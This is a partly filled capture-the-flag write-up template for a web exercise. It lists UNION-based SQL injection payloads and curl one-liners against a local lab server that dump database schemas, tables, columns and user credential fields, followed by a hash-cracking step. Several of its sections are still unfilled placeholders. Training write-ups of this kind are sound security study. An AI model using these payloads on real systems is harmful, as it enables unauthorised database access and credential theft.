# Exercise Name

## 📖 Vulnerability Explanation
[Explain what the vulnerability is, how it works, and why it's dangerous. Include conditions required for exploitation if applicable.]

## ⚙️ Exploitation Process

- Dump databases

```
0 UNION SELECT 1,schema_name FROM information_schema.schemata; -- -
```

```
curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+1%2Cschema_name+FROM+information_schema.schemata%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.*<br\/>//' | sed 's/<\/pre>//' | grep -v table | awk '{print $3}'
```

---

- Dump tables

```
0 UNION SELECT table_schema,table_name FROM information_schema.tables; -- -
```

```
curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+table_schema%2Ctable_name+FROM+information_schema.tables%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/First name: /\n[+] Database   : /' | sed 's/Surname : /[-] Table name : /' | grep -v table
```

---

- Dump columns of table users

```
0 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name=0x7573657273; -- -
```

```
curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+1%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_name%3D0x7573657273%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Surname : //' | grep -v 'First name' | grep -v table
```

---

- Read the columns _comentaires_ and _countersign_

```
0 UNION SELECT Commentaire,countersign FROM Member_Sql_Injection.users; -- -
```

```
curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+Commentaire%2Ccountersign+FROM+Member_Sql_Injection.users%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/First name: /\n[+] Commentaire : /' | sed 's/Surname : /[-] Countersign : /' | grep -v table
```

---

- Crack the hash and craft the flag using the steps provided

> IMAGE crakstation.net

```
sha256sum =(echo -n 'fortytwo')
```

## 🧰 Additional Resources Used *(Optional)*
- [Tool/Script Name]: [Brief description of purpose]
- Example: *Custom Python script to exploit XXE and read arbitrary files from the server.*

## 🔧 Fix
[Describe how to fix the vulnerability]

## ☝️🤓 Advanced explanation
[Provide advanced explanation for the bonus part]